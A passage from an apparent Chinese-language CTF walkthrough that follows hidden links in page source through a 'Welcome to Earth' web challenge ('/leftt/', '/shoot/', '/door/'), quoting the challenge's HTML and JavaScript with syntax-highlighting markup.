sleep(<span class="hljs-number">1000</span>);</span><br><span class="javascript">        die();</span><br><span class="javascript">      &#125;</span><br><span class="javascript"></span><br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">die</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-built_in">window</span>.location = <span class="hljs-string">&quot;/die/&quot;</span>;</span><br><span class="javascript">      &#125;</span><br><span class="javascript"></span><br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">left</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-built_in">window</span>.location = <span class="hljs-string">&quot;/die/&quot;</span>;</span><br><span class="javascript">      &#125;</span><br><span class="javascript"></span><br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leftt</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-built_in">window</span>.location = <span class="hljs-string">&quot;/leftt/&quot;</span>;</span><br><span class="javascript">      &#125;</span><br><span class="javascript"></span><br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">right</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-built_in">window</span>.location = <span class="hljs-string">&quot;/die/&quot;</span>;</span><br><span class="javascript">      &#125;</span><br><span class="javascript"></span><br><span class="javascript">      dietimer();</span><br><span class="javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>  <span class="hljs-comment">&lt;!--哈哈哈哈 左右都是死这是我自己打的--&gt;</span><br></code></pre></td></tr></table></figure><p>没啥思路就继续看，访问 &#x2F;leftt&#x2F; 源码提示了一个目录 </p><p><code> &lt;!-- &lt;button onClick=&quot;window.location=&#39;/shoot/&#39;&quot;&gt;Take the shot&lt;/button&gt; --&gt;</code></p><p>在  &#x2F;shoot&#x2F;中的源码又看到</p><p><code>&lt;button onClick=&quot;window.location=&#39;/door/&#39;&quot;&gt;Continue&lt;/button&gt;</code></p><p>访问 .&#x2F;door&#x2F; 发现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Welcome to Earth<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/js/door.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>YOU APPROACH THE ALIEN CRAFT!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>How do you get inside?<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/img/ship.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;crashed ship&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:60vw;&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;door_form&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;0&quot;</span> /&gt;</span>0<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span>1<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;2&quot;</span> /&gt;</span>2<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;3&quot;</span> /&gt;</span>3<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;4&quot;</span> /&gt;</span>4<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;5&quot;</span> /&gt;</span>5<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;6&quot;</span> /&gt;</span>6<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;7&quot;</span> /&gt;</span>7<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;8&quot;</span> /&gt;</span>8<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;9&quot;</span> /&gt;</span>9<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;10&quot;</span> /&gt;</span>10<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;11&quot;</span> /&gt;</span>11<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;12&quot;</span> /&gt;</span>12<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;13&quot;</span> /&gt;</span>13<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;14&quot;</span> /&gt;</span>14<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;15&quot;</span> /&gt;</span>15<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;16&quot;</span> /&gt;</span>16<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;17&quot;</span> /&gt;</span>17<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;18&quot;</span> /&gt;</span>18<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;19&quot;</span> /&gt;</span>19<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;20&quot;</span> /&gt;</span>20<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;21&quot;</span> /&gt;</span>21<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;22&quot;</span> /&gt;</span>22<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;23&quot;</span> /&gt;</span>23<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;24&quot;</span> /&gt;</span>24<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;25&quot;</span> /&gt;</span>25<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;26&quot;</span> /&gt;</span>26<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;27&quot;</span> /&gt;</span>27<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;28&quot;</span> /&gt;</span>28<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;29&quot;</span> /&gt;</span>29<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;30&quot;</span> /&gt;</span>30<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;31&quot;</span> /&gt;</span>31<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;32&quot;</span> /&gt;</span>32<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;33&quot;</span> /&gt;</span>33<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;34&quot;</span> /&gt;</span>34<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;35&quot;</span> /&gt;</span>35<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;36&quot;</span> /&gt;</span>36<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;37&quot;</span> /&gt;</span>37<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;38&quot;</span> /&gt;</span>38<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;39&quot;</span> /&gt;</span>39<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;40&quot;</span> /&gt;</span>40<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;41&quot;</span> /&gt;</span>41<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;42&quot;</span> /&gt;</span>42<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;43&quot;</span> /&gt;</span>43<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;44&quot;</span> /&gt;</span>44<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;45&quot;</span> /&gt;</span>45<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;46&quot;</span> /&gt;</span>46<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;47&quot;</span> /&gt;</span>47<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;48&quot;</span> /&gt;</span>48<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;49&quot;</span> /&gt;</span>49<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;50&quot;</span> /&gt;</span>50<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;51&quot;</span> /&gt;</span>51<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;52&quot;</span> /&gt;</span>52<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;53&quot;</span> /&gt;</span>53<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;54&quot;</span> /&gt;</span>54<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;55&quot;</span> /&gt;</span>55<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span 